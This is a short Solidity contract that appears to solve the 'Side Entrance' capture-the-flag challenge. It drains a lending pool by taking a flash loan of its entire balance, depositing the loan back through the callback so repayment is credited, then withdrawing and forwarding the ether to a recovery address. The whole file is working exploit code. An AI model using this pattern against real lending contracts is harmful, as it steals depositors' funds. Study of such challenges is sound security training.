// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool pool;
    address recovery;

    constructor(address _pool, address _recovery) {
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw() external {
        pool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }

    receive() external payable {}
}
